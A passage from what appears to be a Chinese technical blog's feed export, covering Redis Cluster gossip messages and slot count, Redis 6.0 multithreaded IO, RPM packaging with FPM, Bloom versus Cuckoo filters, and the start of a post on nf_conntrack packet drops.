CLUSTERMSG_TYPE_PUBLISH 4       <span class="hljs-comment">/* Pub/Sub Publish propagation */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CLUSTERMSG_TYPE_FAILOVER_AUTH_REQUEST 5 <span class="hljs-comment">/* May I failover? */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CLUSTERMSG_TYPE_FAILOVER_AUTH_ACK 6     <span class="hljs-comment">/* Yes, you have my vote */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CLUSTERMSG_TYPE_UPDATE 7        <span class="hljs-comment">/* Another node slots configuration */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CLUSTERMSG_TYPE_MFSTART 8       <span class="hljs-comment">/* Pause clients for manual failover */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CLUSTERMSG_TYPE_MODULE 9        <span class="hljs-comment">/* Module cluster API message. */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CLUSTERMSG_TYPE_COUNT 10        <span class="hljs-comment">/* Total number of message types. */</span></span><br></code></pre></td></tr></table></figure><h4 id="2-1-1、消息头信息"><a href="#2-1-1、消息头信息" class="headerlink" title="2.1.1、消息头信息"></a>2.1.1、消息头信息</h4><p>在节点通信过程中，节点之间需要进行数据交换，以下结构体是节点之间进行数据交换的基础信息：</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> CLUSTER_SLOTS 16384</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">char</span> sig[<span class="hljs-number">4</span>];        <span class="hljs-comment">/* 签名“RCmb”（Redis群集消息总线） */</span><br>    <span class="hljs-type">uint32_t</span> totlen;    <span class="hljs-comment">/* 消息的总长度 */</span><br>    <span class="hljs-type">uint16_t</span> ver;       <span class="hljs-comment">/* 协议版本，目前设置为1 */</span><br>    <span class="hljs-type">uint16_t</span> port;      <span class="hljs-comment">/* TCP基本端口号r. */</span><br>    <span class="hljs-type">uint16_t</span> type;      <span class="hljs-comment">/* 消息类型 */</span><br>    <span class="hljs-type">uint16_t</span> count;     <span class="hljs-comment">/* 仅用于某种消息 */</span><br>    <span class="hljs-type">uint64_t</span> currentEpoch;  <span class="hljs-comment">/* 相应于发送节点的纪元 */</span><br>    <span class="hljs-type">uint64_t</span> configEpoch;   <span class="hljs-comment">/* 如果是主服务器的配置纪元，或者如果它是从</span><br><span class="hljs-comment">     服务器则由其主服务器通告的最后一个纪元 */</span><br>    <span class="hljs-type">uint64_t</span> offset;    <span class="hljs-comment">/* 如果节点是从属节点，则节点是主节点或已处理的</span><br><span class="hljs-comment">     复制偏移量时，主复制偏移量 */</span><br>    <span class="hljs-type">char</span> sender[CLUSTER_NAMELEN]; <span class="hljs-comment">/* 发件人节点的名称 */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> myslots[CLUSTER_SLOTS/<span class="hljs-number">8</span>]; <span class="hljs-comment">/* 发送节点负责的槽信息 */</span><br>    <span class="hljs-type">char</span> slaveof[CLUSTER_NAMELEN]; <span class="hljs-comment">/* 如果发送节点是从节点，记录对应主节点的nodeId */</span><br>    <span class="hljs-type">char</span> myip[NET_IP_STR_LEN];    <span class="hljs-comment">/* 发件人IP，如果不存在则为零 */</span><br>    <span class="hljs-type">char</span> notused1[<span class="hljs-number">34</span>];  <span class="hljs-comment">/* 34个保留字节供将来使用 */</span><br>    <span class="hljs-type">uint16_t</span> cport;      <span class="hljs-comment">/* Sender TCP集群总线端口 */</span><br>    <span class="hljs-type">uint16_t</span> flags;      <span class="hljs-comment">/* 发件人节点标志 */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> state; <span class="hljs-comment">/* 来自发件人POV的集群状态 */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> mflags[<span class="hljs-number">3</span>]; <span class="hljs-comment">/* 消息标志：CLUSTERMSG_FLAG [012] _... */</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">clusterMsgData</span> <span class="hljs-title">data</span>;</span> <span class="hljs-comment">/* 群集消息数据 */</span><br>&#125; clusterMsg;<br></code></pre></td></tr></table></figure><p>这里只讨论与slots相关的<code>unsigned char myslots[CLUSTER_SLOTS/8];</code>这一项信息，该项为一个<code>char</code>数组，这个数组实际上是一个<code>bitmap</code>，这个<code>bitmap</code>的每一位表示一个槽，如果对应的槽位为<code>1</code>，代表对应的槽位是属于该节点的。</p><p>分析整个结构体可以看出其中空间占用最大的就是<code>unsigned char myslots[CLUSTER_SLOTS/8];</code>这一项，占用空间<code>16384/8/1024=2kb</code>，因此，如果槽位为<code>65536</code>，发送心跳信息的消息头达<code>8k</code>，发送的心跳包过于庞大；</p><h3 id="2-1-2、消息体信息"><a href="#2-1-2、消息体信息" class="headerlink" title="2.1.2、消息体信息"></a>2.1.2、消息体信息</h3><p>在消息体中，会携带一定数量的其他节点信息用于交换。其他节点的信息的数量约为集群总节点数量的1&#x2F;10，至少携带3个节点的信息，<strong>节点数量越多，消息体内容越大</strong>，10个节点状态下的消息体的大小大概约为1Kb左右；</p><p>具体消息体的信息是？？？待分析</p><h2 id="2-2、节点数据交换的频率"><a href="#2-2、节点数据交换的频率" class="headerlink" title="2.2、节点数据交换的频率"></a>2.2、节点数据交换的频率</h2><p><code>Cluster</code>节点之间的<code>ping/pong</code>操作由<code>clusterCron()</code>函数不断触发，该函数每秒执行<code>10</code>次，在<code>clusterCron()</code>函数中，每调用<code>10</code>次，执行一次<code>Cluster</code>节点的<code>ping</code>操作，相关代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 每秒执行10次 */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">clusterCron</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>  <span class="hljs-comment">/* 省略部分代码... */</span><br>  <span class="hljs-comment">/* 每10次迭代对一些随机节点进行1次ping操作，这样我们通常每秒ping一个随机节点 */</span><br>    <span class="hljs-keyword">if</span> (!(iteration % <span class="hljs-number">10</span>)) &#123;<br>        <span class="hljs-type">int</span> j;<br><br>      <span class="hljs-comment">/* 检查几个随机节点并使用最早的pong_received时间ping一个节点. */</span><br>        <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">5</span>; j++) &#123;<br>            de = dictGetRandomKey(server.cluster-&gt;nodes);<br>            clusterNode *this = dictGetVal(de);<br><br>            <span class="hljs-comment">/* Don&#x27;t ping nodes disconnected or with a ping currently active.</span><br><span class="hljs-comment">            /* 不要ping断开连接的节点或当前活跃的节点. */</span><br>            <span class="hljs-keyword">if</span> (this-&gt;link == <span class="hljs-literal">NULL</span> || this-&gt;ping_sent != <span class="hljs-number">0</span>) <span class="hljs-keyword">continue</span>;<br>            <span class="hljs-keyword">if</span> (this-&gt;flags &amp; (CLUSTER_NODE_MYSELF|CLUSTER_NODE_HANDSHAKE))<br>                <span class="hljs-keyword">continue</span>;<br>            <span class="hljs-keyword">if</span> (min_pong_node == <span class="hljs-literal">NULL</span> || min_pong &gt; this-&gt;pong_received) &#123;<br>                min_pong_node = this;<br>                min_pong = this-&gt;pong_received;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (min_pong_node) &#123;<br>            serverLog(LL_DEBUG,<span class="hljs-string">&quot;Pinging node %.40s&quot;</span>, min_pong_node-&gt;name);<br>            clusterSendPing(min_pong_node-&gt;link, CLUSTERMSG_TYPE_PING);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">/* 省略部分代码... */</span><br>  di = dictGetSafeIterator(server.cluster-&gt;nodes);<br>    <span class="hljs-keyword">while</span>((de = dictNext(di)) != <span class="hljs-literal">NULL</span>) &#123;<br>      <span class="hljs-comment">/* 省略部分代码... */</span><br>      <span class="hljs-comment">/* 如果我们当前在此实例中没有活动的ping，并且收到的PONG早于</span><br><span class="hljs-comment">       * 群集超时的一半，则立即发送新的ping，以确保所有节点都被ping，</span><br><span class="hljs-comment">       * 而没有太大的延迟 */</span><br>        <span class="hljs-keyword">if</span> (node-&gt;link &amp;&amp;<br>            node-&gt;ping_sent == <span class="hljs-number">0</span> &amp;&amp;<br>            (now - node-&gt;pong_received) &gt; server.cluster_node_timeout/<span class="hljs-number">2</span>)<br>        &#123;<br>            clusterSendPing(node-&gt;link, CLUSTERMSG_TYPE_PING);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>      <span class="hljs-comment">/* 省略部分代码... */</span><br>&#125;<br>   dictReleaseIterator(di);<br>&#125;<br></code></pre></td></tr></table></figure><p>上述代码的大致逻辑是：</p><ul><li>每次（秒）会随机选取<code>5个</code>节点，找出最久没有通信的节点发送<code>ping</code>消息；</li><li>每<code>100毫秒</code>(<code>1秒10次</code>)都会扫描本地节点列表，如果发现节点最近一次接受<code>pong</code>消息的时间大于<code>cluster-node-timeout/2</code>则立刻发送<code>ping</code>消息；</li></ul><p><strong>因此我们可以计算出每秒单节点发出的ping消息的数量为：</strong></p><p><code>1+10*numOf(node.pong_received&gt;cluster_node_timeout/2)</code></p><p>针对于大致的带宽消耗，《Redis的开发与运维》中在第10章 集群的集群运维 - 带宽消耗小节中，有这么一句话：</p><blockquote><p>例如，一个总节点数为200的Redis集群，部署在20台物理机上每台划分10个节点，cluster-node-timeout采用默认15秒，这时ping&#x2F;pong消息占用带宽达到25Mb。如果把cluster-node-timeout设为20，对带宽的消耗降低到15Mb以下。</p></blockquote><ul><li>相关链接：<a href="https://mp.weixin.qq.com/s?__biz=MzIwMDgzMjc3NA==&mid=247484663&idx=1&sn=bffafa6cbaa2a0bdf8ab487901867932&utm_source=tuicool&utm_medium=referral">面试官:知道为什么RedisCluster有16384个槽么?</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
          <category> RedisCluster </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> RedisCluster </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis的多线程特性</title>
      <link href="/2019/09/01/redis-multithreading/"/>
      <url>/2019/09/01/redis-multithreading/</url>
      
        <content type="html"><![CDATA[<p>Redis6.0即将发布，比较吸引我的便是Redis6.0支持的多线程技术，Redis本身也并不是简单的单进程&#x2F;线程模型，包括bgsave的进程以及对于一些慢请求的io线程（惰性删除，日志刷盘等），这次多线程的优化主要解决了Redis单进程&#x2F;线程处理模型在协议解析以及网络IO上的消耗问题，在命令的处理上仍旧是单线程。</p><h2 id="一、逻辑分析"><a href="#一、逻辑分析" class="headerlink" title="一、逻辑分析"></a>一、逻辑分析</h2><h3 id="2-1、两个配置"><a href="#2-1、两个配置" class="headerlink" title="2.1、两个配置"></a>2.1、两个配置</h3><ul><li><code>io-threads</code>：启用的IO的线程数，最大为128（老版本中配置判断为512，新版本已经修复统一为128）；</li><li><code>io-threads-do-reads</code>：是否启用IO多线程；</li></ul><h3 id="2-2、两个队列"><a href="#2-2、两个队列" class="headerlink" title="2.2、两个队列"></a>2.2、两个队列</h3><ul><li><code>clients_pending_read</code>：待处理的客户端的请求数据队列（需要进行协议解析等操作）；</li><li><code>clients_pending_write</code>：待处理的客户端的回复数据队列（需要进行回复客户端等操作）；</li></ul><h3 id="2-3、两类线程"><a href="#2-3、两类线程" class="headerlink" title="2.3、两类线程"></a>2.3、两类线程</h3><p><strong>注意：启用的所有的多线程在同一时刻执行的任务类型是一样的</strong></p><ul><li><code>IO_THREADS_OP_WRITE</code>：执行<code>clients_pending_read</code>任务的线程；</li><li><code>IO_THREADS_OP_READ</code>：执行<code>clients_pending_write</code>任务的线程；</li></ul><h3 id="2-4、多个函数"><a href="#2-4、多个函数" class="headerlink" title="2.4、多个函数"></a>2.4、多个函数</h3><ul><li><p><code>initThreadedIO</code>：初始化多线程，并将多线程置为停止状态；</p></li><li><p><code>startThreadedIO</code>：启动多线程，并将<code>io_threads_active</code>状态置为<code>1</code>；</p></li><li><p><code>stopThreadedIO</code>：停止多线程，并将<code>io_threads_active</code>状态置为<code>0</code>，需要处理多线程中未处理完成的任务；</p></li><li><p><code>IOThreadMain</code>：多线程的执行函数，依据多线程的操作不同（<code>IO_THREADS_OP_WRITE</code>&#x2F;<code>IO_THREADS_OP_READ</code>）执行对应的客户端的回复或者读取操作；</p></li><li><p><code>handleClientsWithPendingWritesUsingThreads</code>：将<code>clients_pending_write</code>队列中待处理的处理客户端的<code>回复</code>分配给线程进行回复等操作；</p></li><li><p><code>handleClientsWithPendingReadsUsingThreads</code>：将<code>clients_pending_read</code>队列中待处理的客户端的<code>请求</code>分配给处理线程进行协议解析等操作，然后执行相应的命令逻辑；</p></li><li><p><code>afterSleep</code>：事件循环执行完成之后调用，函数内会调用<code>handleClientsWithPendingReadsUsingThreads</code>函数；</p></li><li><p><code>processCommandAndResetClient</code>：封装了<code>processCommand</code>函数，增加多线程模型的情况的处理逻辑；</p></li><li><p><code>postponeClientRead</code>：依据是否启动多线程，直接处理客户端的请求还是将请求添加到待处理队列<code>clients_pending_read</code>中；</p></li><li><p><code>stopThreadedIOIfNeeded</code>：如果<code>clients_pending_write</code>较小，即客户端数量较少时自动停止多线程；</p></li></ul><p><img src="/assets/images/redis-multithreading.png" alt="逻辑示意图" loading="lazy"></p><p>参考文档：<a href="https://mp.weixin.qq.com/s/6WQNq5dNk-GuEhZXtVCo-A">https://mp.weixin.qq.com/s/6WQNq5dNk-GuEhZXtVCo-A</a></p>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
          <category> 特性 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用FPM优雅的进行rpm打包</title>
      <link href="/2019/08/27/use-fpm-to-mkrpm/"/>
      <url>/2019/08/27/use-fpm-to-mkrpm/</url>
      
        <content type="html"><![CDATA[<h2 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h2><p>对于有过构建rpm安装包相关操作的应该知道可以使用<code>spec文件</code>以及<code>rpmbuild指令</code>进行打包操作，不过<code>spec文件</code>的编写也是一个十分令人头懂的事情，我之前曾经有过一篇使用spec文件打包的文章，参考<a href="https://www.bugwz.com/2019/01/01/make-rpm/">RPM打包记录</a>，这里介绍一个更高效，更人性化的打包工具：<a href="https://github.com/jordansissel/fpm">FPM</a>。</p><p>FPM是一个快速高效的打包工具，该工具本身为Ruby的一个模块，因此使用该工具之前需要安装Ruby；</p><h2 id="二、安装与使用"><a href="#二、安装与使用" class="headerlink" title="二、安装与使用"></a>二、安装与使用</h2><h3 id="2-1、安装"><a href="#2-1、安装" class="headerlink" title="2.1、安装"></a>2.1、安装</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装ruby</span><br>yum -y install ruby rubygems ruby-devel<br><br><span class="hljs-comment"># 替换国内的ruby镜像</span><br>gem sources --add https://gems.ruby-china.com/ --remove https://rubygems.org/<br><br><span class="hljs-comment"># 验证镜像是否替换成功</span><br>gem sources -l<br><br><span class="hljs-comment"># 安装fpm</span><br>gem install fpm<br></code></pre></td></tr></table></figure><h3 id="2-2、参数介绍"><a href="#2-2、参数介绍" class="headerlink" title="2.2、参数介绍"></a>2.2、参数介绍</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">-f :强制覆盖[覆盖同名rpm包]<br>-n :指定的rpm包名<br>-p :指定的rpm包文件放置位置，最后将rpm存放在该路径下；<br>-v :指定的rpm包版本<br>-d :指定依赖的软件   ( [-d <span class="hljs-string">&#x27;name&#x27;</span>] or [-d <span class="hljs-string">&#x27;name &gt; version&#x27;</span>] 例子: -d <span class="hljs-string">&#x27;libstdc++ &gt;= 4.4.3&#x27;</span>)<br>-a :指定系统架构,如果是noarch则为<span class="hljs-string">&#x27;-a all&#x27;</span> 或者 <span class="hljs-string">&#x27;-a native&#x27;</span> [x86_64] 当软件不区分64位或32位的时候可以 noarch<br>-s :指定input的数据类型，默认为<span class="hljs-built_in">dir</span>数据类型，支持的源类型：<span class="hljs-string">&quot;dir&quot;</span> <span class="hljs-string">&quot;rpm&quot;</span> <span class="hljs-string">&quot;gem&quot;</span> <span class="hljs-string">&quot;python&quot;</span> <span class="hljs-string">&quot;empty&quot;</span> <span class="hljs-string">&quot;tar&quot;</span> <span class="hljs-string">&quot;deb&quot;</span> <span class="hljs-string">&quot;cpan&quot;</span> <span class="hljs-string">&quot;npm&quot;</span> <span class="hljs-string">&quot;osxpkg&quot;</span> <span class="hljs-string">&quot;pear&quot;</span> <span class="hljs-string">&quot;pkgin&quot;</span> <span class="hljs-string">&quot;virtualenv&quot;</span> <span class="hljs-string">&quot;zip&quot;</span><br>-m :指定打包人员[Packager]  ([ -m <span class="hljs-string">&#x27;user&#x27;</span>])<br>-C :指定打包的相对路径,类似于buildroot. 比如 -C /tmp/apr/，同时在 /tmp/apr/ 目录下存在一个 usr/local/bin/ 目录，则最后打包安装的目录信息为 /usr/loca/bin/；<br>-t :指定需要制作成什么包,可选项有：<span class="hljs-string">&quot;rpm&quot;</span> <span class="hljs-string">&quot;deb&quot;</span> <span class="hljs-string">&quot;solaris&quot;</span> <span class="hljs-string">&quot;puppet&quot;</span> <span class="hljs-string">&quot;dir&quot;</span> <span class="hljs-string">&quot;osxpkg&quot;</span> <span class="hljs-string">&quot;p5p&quot;</span> <span class="hljs-string">&quot;puppet&quot;</span> <span class="hljs-string">&quot;sh&quot;</span> <span class="hljs-string">&quot;solaris&quot;</span> <span class="hljs-string">&quot;tar&quot;</span> <span class="hljs-string">&quot;zip&quot;</span><br>--description  :软件包描述<br>--conflicts:指定冲突软件<br>--url:指定站点[例如:<span class="hljs-string">&quot;http://www.cnblog.com/roach57&quot;</span> ]<br>--verbose:安装过程详细打印<br>--after-install   :包安装之后执行的脚本 也可写作 --post-install FILE<br>--before-install  :包安装之前执行的脚本 <br>--after-remove    :包卸载之后执行的脚本<br>--before-remove   :包卸载之前执行的脚本<br>--after-upgrade   :包更新之后执行的脚本[仅支持 deb 和 rpm 这两种包]<br>--before-upgrade  :包更新之前执行的脚本<br>--iteration       :发布序号[就是rpm包里面的release]<br>--epoch           :纪元<br>--no-rpm-sign     :不使用rpm签名   Signature<br>--license         :证书许可 [可选项有 <span class="hljs-string">&#x27;BSD(开源软件)&#x27;</span> <span class="hljs-string">&#x27;GPLv2(自由软件)&#x27;</span> <span class="hljs-string">&#x27;MIT&#x27;</span> <span class="hljs-string">&#x27;Public Domain(公共域)&#x27;</span> <span class="hljs-string">&#x27;Distributable(贡献)&#x27;</span> <span class="hljs-string">&#x27;commercial(商业)&#x27;</span> <span class="hljs-string">&#x27;Share(共享)等&#x27;</span>,一般的开发都写<span class="hljs-string">&#x27;BSD&#x27;</span>或<span class="hljs-string">&#x27;GPL&#x27;</span>]<br>--vendor          :供应商名称 [ --vendor <span class="hljs-string">&#x27;admin@fpm.com&#x27;</span>]<br>--no-depends      :代表没有任何依赖包,和-d是对立的,不能共用<br>--config-files    :指定配置文件,可以指定目录[递归]<br>--directories     :指定包目录<br>--category        :软件所属的类别，参考SPEC文件中的Group配置项<br></code></pre></td></tr></table></figure><h3 id="2-3、打包实践"><a href="#2-3、打包实践" class="headerlink" title="2.3、打包实践"></a>2.3、打包实践</h3><ul><li><p>初始目录信息：</p><ul><li><code>/data/test/</code>目录列表为：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">`-- usr<br>    `-- <span class="hljs-built_in">local</span><br>        `-- bin<br>            `-- sh<br>                `-- install.sh<br>                `-- remove.sh<br>                `-- run.sh<br></code></pre></td></tr></table></figure><ul><li><code>/data/out/</code>目录为空；</li><li><code>/usr/local/bin/sh</code>目录不存在；</li></ul></li><li><p>打包脚本如下所示：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">fpm -f -s <span class="hljs-built_in">dir</span> -t rpm -n mysh \<br>-v 1.5 \<br>--iteration 6 \<br>-C /data/test/ \<br>-p /data/out/ \<br>--description <span class="hljs-string">&#x27;This is mysh rpm&#x27;</span> \<br>--url <span class="hljs-string">&#x27;http://www.mysh.com&#x27;</span> \<br>--after-install /data/test/usr/local/bin/sh/install.sh \<br>--after-remove /data/test/usr/local/bin/sh/remove.sh<br></code></pre></td></tr></table></figure></li><li><p>执行脚本后日志信息为：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">Created package &#123;:path=&gt;<span class="hljs-string">&quot;/data/out/mysh-1.5-6.x86_64.rpm&quot;</span>&#125;<br></code></pre></td></tr></table></figure></li><li><p>本地安装指定的rpm包：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">yum localinstall -y /data/out/mysh-1.5-6.x86_64.rpm<br></code></pre></td></tr></table></figure></li><li><p>本地的<code>/usr/local/bin/sh</code>目录中可查看到指定的三个sh文件；</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> RPM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BloomFilter 和 CuckooFilter 对比解析</title>
      <link href="/2019/08/12/bloom-and-cuckoo-filter/"/>
      <url>/2019/08/12/bloom-and-cuckoo-filter/</url>
      
        <content type="html"><![CDATA[<p>BloomFilter 和 CuckooFilter 都是一种用于数据存在性判断的数据结构。布隆过滤器早在 1970 年就被提出，它由一个二进制向量数组和一系列随机映射函数组成。它可以用于检索一个元素是否一定不在集合中或者可能存在集合中。布谷鸟过滤器的提出相对较晚，它创新性的提出了可以删除的实现方式，解决了布隆过滤器无法删除数据的痛点。这两者各有优劣，需要结合具体的使用姿势来进行选择。</p><h2 id="一、BloomFilter"><a href="#一、BloomFilter" class="headerlink" title="一、BloomFilter"></a>一、BloomFilter</h2><p><code>Bloom Filter</code>（布隆过滤器）是<code>1970</code>年由布隆提出的，它由一个二进制向量数组和一系列随机映射函数组成。它可以用于检索一个元素是否<strong>一定不在集合中</strong>或者<strong>可能存在集合中</strong>。</p><ul><li><a href="http://www.dragonwins.com/domains/getteched/bbc/literature/Bloom70.pdf">《Space&#x2F;Time Trade-offs in Hash Coding with Allowable Errors》</a></li></ul><h3 id="1-1、实现原理"><a href="#1-1、实现原理" class="headerlink" title="1.1、实现原理"></a>1.1、实现原理</h3><ul><li><strong>初始化内存区域</strong>：在内存中开辟一块储存空间，并将里面的比特位全部初始化为<code>0</code>；</li><li><strong>设置k个hash函数</strong>：初始化<code>k</code>个<code>hash</code>函数，用于元素的数据映射；</li><li><strong>比特位映射</strong>：通过<code>k</code>个<code>hash</code>函数，将元素映射到存储空间对应的比特位，并将对应的比特位设置为<code>1</code>；</li></ul><p><img src="/assets/images/bloom-filter-principle.png" alt="原理图" loading="lazy"></p><h3 id="1-2、优缺点"><a href="#1-2、优缺点" class="headerlink" title="1.2、优缺点"></a>1.2、优缺点</h3><ul><li><strong>优点</strong>：<ul><li>散列函数相互之间没有关系，方便由硬件并行实现；</li><li>不需要存储元素本身，在某些对保密要求非常严格的场合有优势；</li></ul></li><li><strong>缺点</strong>：<ul><li>布隆过滤器存储空间和插入&#x2F;查询时间都是<code>O(k)</code>，导致查询性能较弱；</li><li>误算率随着存入的元素数量增多而不断增加；</li><li>由于不能确定某个元素是否一定存在，因此无法删除元素；</li><li>空间利用效率低；</li></ul></li></ul><h2 id="二、CuckooFilter"><a href="#二、CuckooFilter" class="headerlink" title="二、CuckooFilter"></a>二、CuckooFilter</h2><p><code>Cuckoo Filter</code>（布谷鸟过滤器）使用一维数组存储元素的指纹信息（会存在误判率），同时使用两个 hash 函数获得指纹的<code>位置id</code>，在每个位置可以放置多个座位。这两个 <code>hash 函数</code>选择的比较特殊，因为过滤器中只能存储指纹信息。当这个位置上的指纹被挤兑之后，它需要计算出另一个对偶位置，下面会单独对这<code>两个hash函数</code>进行解析。</p><ul><li><p><a href="https://www.cs.cmu.edu/~dga/papers/cuckoo-conext2014.pdf">《Cuckoo Filter: Practically Better Than Bloom》</a></p></li><li><p><a href="https://github.com/efficient/cuckoofilter">Cuckoo Filter C 库</a></p></li></ul><h3 id="2-1、实现原理"><a href="#2-1、实现原理" class="headerlink" title="2.1、实现原理"></a>2.1、实现原理</h3><ul><li><strong>初始化内存</strong>：初始化一块内存给一维数组<code>Buckets</code>，其中每个<code>Bucket</code>有<code>n</code>个位置可供使用，每个位置存储对应元素的指纹信息，即每个<code>Bucket</code>中可供存储<code>n</code>个元素的指纹信息；</li><li><strong>Bucket映射</strong>：通过<code>两个Hash</code>函数得到两个对应的位置点（<code>p1</code>和<code>p2</code>）信息，尝试将对应元素的指纹信息存入指定的Bucket中，如果<code>p1</code>对应的<code>Bucket</code>已经填充满了，则尝试填充到<code>p2</code>对应的<code>Bucket</code>中；</li><li><strong>元素指纹挤兑</strong>：当两个位置点（<code>p1</code>和<code>p2</code>）对应的<code>Bucket</code>都已经填充满了就会触发填充挤兑，从<code>p1</code>和<code>p2</code>对应的<code>Bucket</code>中随机选择一个进行挤兑操作，将<code>Bucket</code>中的已经存在的指纹信息踢除（被踢除的指纹信息会存储到它可存储的另一个<code>Bucket</code>中，如果另一个<code>Bucket</code>中也没有了位置，则又会触发挤兑操作，直到达到挤兑操作的上限），然后将该指纹信息存储到当前的<code>Bucket</code>中；</li></ul><h4 id="2-1-1、一维数组的特性"><a href="#2-1-1、一维数组的特性" class="headerlink" title="2.1.1、一维数组的特性"></a>2.1.1、一维数组的特性</h4><p>布谷鸟过滤器强制一维数组的长度必须是 <code>2 的指数</code>，所以对数组的长度取模等价于取 hash 值的最后 n 位。在进行异或运算时，忽略掉低 n 位 之外的其它位就行。将计算出来的位置 p 保留低 n 位就是最终的对偶位置。</p><h4 id="2-1-2、两个hash函数的特性"><a href="#2-1-2、两个hash函数的特性" class="headerlink" title="2.1.2、两个hash函数的特性"></a>2.1.2、两个hash函数的特性</h4><p>因为布谷鸟过滤器中只存储指纹信息，当这个位置上的指纹被挤兑之后，它需要计算出另一个对偶位置，而计算这个对偶位置是需要元素本身的，但是布谷鸟过滤器巧妙的设计了一个独特的 <code>hash函数</code>，使得可以根据 <code>p1</code> 和 <code>元素指纹</code> 直接计算出 <code>p2</code>，而不需要完整的 <code>x 元素</code>。</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">fp = fingerprint(x)<br>p1 = <span class="hljs-built_in">hash</span>(x)<br>p2 = p1 ^ <span class="hljs-built_in">hash</span>(fp)  // 异或<br></code></pre></td></tr></table></figure><p><img src="/assets/images/cuckoo-filter-principle.png" alt="原理图" loading="lazy"></p><h3 id="2-2、优缺点"><a href="#2-2、优缺点" class="headerlink" title="2.2、优缺点"></a>2.2、优缺点</h3><ul><li><strong>优点</strong>：<ul><li>查询性能较高；</li><li>空间利用率较高；</li><li>保证了一个比特只被一个元素映射，所以允许删除操作；</li></ul></li><li><strong>缺点</strong>：<ul><li>不能完美的支持删除，存在误删的情况；</li><li>存储空间的大小必须为2的指数的限制让空间效率打了折扣；</li></ul></li></ul><h3 id="2-3、场景分析"><a href="#2-3、场景分析" class="headerlink" title="2.3、场景分析"></a>2.3、场景分析</h3><h4 id="2-3-1、相同元素多次连续插入"><a href="#2-3-1、相同元素多次连续插入" class="headerlink" title="2.3.1、相同元素多次连续插入"></a>2.3.1、相同元素多次连续插入</h4><p>假设每个<code>Bucket</code>的可供存储的座位为<code>4</code>，那么当相同的元素多次连续插入之后，<code>Cuckoo Filter</code>会对同一个元素进行了挤兑循环操作，导致同一个元素的指纹会占用<code>两个</code>位置上的所有的<code>8个座位</code>，导致空间利用率较低。</p><h4 id="2-3-2、误删情况"><a href="#2-3-2、误删情况" class="headerlink" title="2.3.2、误删情况"></a>2.3.2、误删情况</h4><p>由于存在不同元素被hash到同一个位置的情况，以及不同元素指纹相同的情况，所以会存在一定的误判率。</p><p>参考链接：<a href="https://juejin.im/post/5cfb9c74e51d455d6d5357db">https://juejin.im/post/5cfb9c74e51d455d6d5357db</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次nf_conntrack模块导致的丢包问题</title>
      <link href="/2019/08/10/nf-conntrack/"/>
      <url>/2019/08/10/nf-conntrack/</url>
      
        <content type="html"><![CDATA[<h2 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h2><p>我们灰度线上业务的时候，有一次遇到了业务反馈资源没有读写，当时正好将流量切到了线上的一台机器上，在将业务的资源迁移回滚之后，经过一番查找，发现<code>/var/log/message</code>中打印了很多关于<code>kernel: nf_conntrack: table full, dropping packet</code>的错误信息，网上查找了一下，这个错误主要是由于启用了<code>nf_conntrack模块</code>，之前很多人都遇到了这个问题，解决方案也很多，这里以我的角度详细记录一下，<code>/var/log/message</code>中错误信息如下：</p><figure class="highlight v"><table><tr><td class="code"><pre><code class="hljs v">Jul <span class="hljs-number">30</span> <span class="hljs-number">11</span>:<span class="hljs-number">50</span>:<span class="hljs-number">01</span> dbl14192 systemd: Starting Session <span class="hljs-number">486429</span> of user root.<br>Jul <span class="hljs-number">30</span> <span class="hljs-number">11</span>:<span class="hljs-number">50</span>:<span class="hljs-number">02</span> dbl14192 kernel: nf_conntrack: <span class="hljs-keyword">table</span> full, dropping packet<br>Jul <span class="hljs-number">30</span> <span class="hljs-number">11</span>:<span class="hljs-number">50</span>:<span class="hljs-number">02</span> dbl14192 kernel: nf_conntrack: <span class="hljs-keyword">table</span> full, dropping packet<br>Jul <span class="hljs-number">30</span> <span class="hljs-number">11</span>:<span class="hljs-number">50</span>:<span class="hljs-number">02</span> dbl14192 